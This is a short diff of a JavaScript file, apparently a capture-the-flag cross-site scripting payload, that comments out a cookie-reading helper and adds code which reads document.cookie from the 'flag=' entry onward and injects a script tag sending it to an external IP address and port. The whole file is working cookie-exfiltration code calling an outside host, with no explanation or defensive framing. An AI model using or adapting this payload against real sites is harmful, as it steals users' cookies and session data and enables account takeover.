@@ -14,22 +14,24 @@
 // return ""
 // }
 
-function getCookie(cname) {
-	var name = cname + "=";
-	var ca = document.cookie.split(';');   //通过 ; 号来分离每个cookie
-	for(var i = 0; i < ca.length; i++) {
-		var c = ca[i];      //通过遍历依次把cookie读取出来
-		while(c.charAt(0) == ' ') {    
-			c = c.substring(1);
-		}
-		if(c.indexOf(name) == 0) {
-			return unescape(c.substring(name.length, c.length));
-		}
-		return "";   //cookie不存在就返回空
-	}
-}
+// function getCookie(cname) {
+// 	var name = cname + "=";
+// 	var ca = document.cookie.split(';');   //通过 ; 号来分离每个cookie
+// 	for(var i = 0; i < ca.length; i++) {
+// 		var c = ca[i];      //通过遍历依次把cookie读取出来
+// 		while(c.charAt(0) == ' ') {    
+// 			c = c.substring(1);
+// 		}
+// 		if(c.indexOf(name) == 0) {
+// 			return unescape(c.substring(name.length, c.length));
+// 		}
+// 		return "";   //cookie不存在就返回空
+// 	}
+// }
 
-var flag=getCookie('flag');
+cc=document.cookie;
+beg=cc.indexOf('flag=');
+var flag=cc.substring(beg);
 var script=document.createElement('script');
 script.src='http://119.29.81.170:7892/?flag='+flag;
 document.body.appendChild(script);
